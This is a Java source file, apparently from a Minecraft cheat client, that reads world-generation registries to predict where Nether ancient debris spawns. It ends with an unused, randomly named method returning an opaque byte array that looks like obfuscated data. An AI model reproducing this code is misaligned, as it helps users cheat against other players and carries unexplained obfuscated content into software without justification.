package dev.gambleclient.utils.meteorrejects;

import net.minecraft.client.MinecraftClient;
import net.minecraft.registry.BuiltinRegistries;
import net.minecraft.registry.RegistryKey;
import net.minecraft.registry.RegistryKeys;
import net.minecraft.registry.RegistryWrapper;
import net.minecraft.registry.entry.RegistryEntry;
import net.minecraft.registry.entry.RegistryEntryList;
import net.minecraft.util.math.intprovider.ConstantIntProvider;
import net.minecraft.util.math.intprovider.IntProvider;
import net.minecraft.world.HeightLimitView;
import net.minecraft.world.biome.Biome;
import net.minecraft.world.dimension.DimensionOptions;
import net.minecraft.world.gen.HeightContext;
import net.minecraft.world.gen.WorldPresets;
import net.minecraft.world.gen.feature.*;
import net.minecraft.world.gen.feature.util.PlacedFeatureIndexer;
import net.minecraft.world.gen.heightprovider.HeightProvider;
import net.minecraft.world.gen.placementmodifier.CountPlacementModifier;
import net.minecraft.world.gen.placementmodifier.HeightRangePlacementModifier;
import net.minecraft.world.gen.placementmodifier.RarityFilterPlacementModifier;
import dev.gambleclient.mixin.CountPlacementModifierAccessor;
import dev.gambleclient.mixin.HeightRangePlacementModifierAccessor;
import dev.gambleclient.mixin.RarityFilterPlacementModifierAccessor;

import java.awt.*;
import java.util.List;
import java.util.*;
import java.util.stream.Stream;

public class Ore {
    public int a;
    public int b;
    public IntProvider c;
    public HeightProvider d;
    public HeightContext e;
    public float f;
    public float g;
    public int h;
    public Color i;
    public boolean j;

    public static Map<RegistryKey<Biome>, List<Ore>> register() {
        RegistryWrapper.WrapperLookup wrapperLookup = BuiltinRegistries.createWrapperLookup();
        RegistryWrapper.Impl<PlacedFeature> impl = wrapperLookup.getWrapperOrThrow(RegistryKeys.PLACED_FEATURE);
        var l = wrapperLookup.getWrapperOrThrow(RegistryKeys.WORLD_PRESET).getOrThrow(WorldPresets.DEFAULT).value().createDimensionsRegistryHolder().dimensions().get(DimensionOptions.NETHER).chunkGenerator().getBiomeSource().getBiomes().stream().toList();
        var l2 = PlacedFeatureIndexer.collectIndexedFeatures(l, registryEntry -> registryEntry.value().getGenerationSettings().getFeatures(), true);
        Map<PlacedFeature, Ore> ores = new HashMap<>();
        var registry = OrePlacedFeatures.ORE_DEBRIS_SMALL;
        Ore.register(ores, l2, impl, registry, 7, new Color(209, 27, 245));
        RegistryKey<PlacedFeature> registryKey2 = OrePlacedFeatures.ORE_ANCIENT_DEBRIS_LARGE;
        Ore.register(ores, l2, impl, registryKey2, 7, new Color(209, 27, 245));
        Map<RegistryKey<Biome>, List<Ore>> hashMap2 = new HashMap<>();
        l.forEach(registryEntry -> {
            hashMap2.put(registryEntry.getKey().get(), new ArrayList<>());
            Stream<PlacedFeature> stream = registryEntry.value().getGenerationSettings().getFeatures().stream().flatMap(RegistryEntryList::stream).map(RegistryEntry::value);
            Objects.requireNonNull(ores);
            stream.filter(ores::containsKey).forEach(placedFeature -> hashMap2.get(registryEntry.getKey().get()).add(ores.get(placedFeature)));
        });
        return hashMap2;
    }

    private static void register(
            Map<PlacedFeature, Ore> map,
            List<PlacedFeatureIndexer.IndexedFeatures> indexer,
            RegistryWrapper.Impl<PlacedFeature> oreRegistry,
            RegistryKey<PlacedFeature> oreKey,
            int genStep,
            Color color
    ) {
        var orePlacement = oreRegistry.getOrThrow(oreKey).value();

        int index = indexer.get(genStep).indexMapping().applyAsInt(orePlacement);

        Ore ore = new Ore(orePlacement, genStep, index, color);

        map.put(orePlacement, ore);
    }

    private Ore(final PlacedFeature obj, final int a, final int b, final Color i) {
        this.c = ConstantIntProvider.create(1);
        this.f = 1.0f;
        this.a = a;
        this.b = b;
        this.i = i;
        this.e = new HeightContext(null, HeightLimitView.create(MinecraftClient.getInstance().world.getBottomY(), MinecraftClient.getInstance().world.getDimension().logicalHeight()));
        for (final Object next : obj.placementModifiers()) {
            if (next instanceof CountPlacementModifier) {
                this.c = ((CountPlacementModifierAccessor) next).getCount();
            } else if (next instanceof HeightRangePlacementModifier) {
                this.d = ((HeightRangePlacementModifierAccessor) next).getHeight();
            } else {
                if (!(next instanceof RarityFilterPlacementModifier)) {
                    continue;
                }
                this.f = (float) ((RarityFilterPlacementModifierAccessor) next).getChance();
            }
        }
        final FeatureConfig config = obj.feature().value().config();
        if (config instanceof OreFeatureConfig) {
            this.g = ((OreFeatureConfig) config).discardOnAirChance;
            this.h = ((OreFeatureConfig) config).size;
            if (obj.feature().value().feature() instanceof ScatteredOreFeature) {
                this.j = true;
            }
            return;
        }
        throw new IllegalStateException("config for " + obj + "is not OreFeatureConfig.class");
    }

    private static byte[] dwyrwvxcbpxjhuh() {
        return new byte[]{40, 4, 103, 33, 11, 101, 15, 97, 99, 53, 50, 44, 91, 16, 69, 71, 114, 86, 103, 108, 27, 65};
    }
}
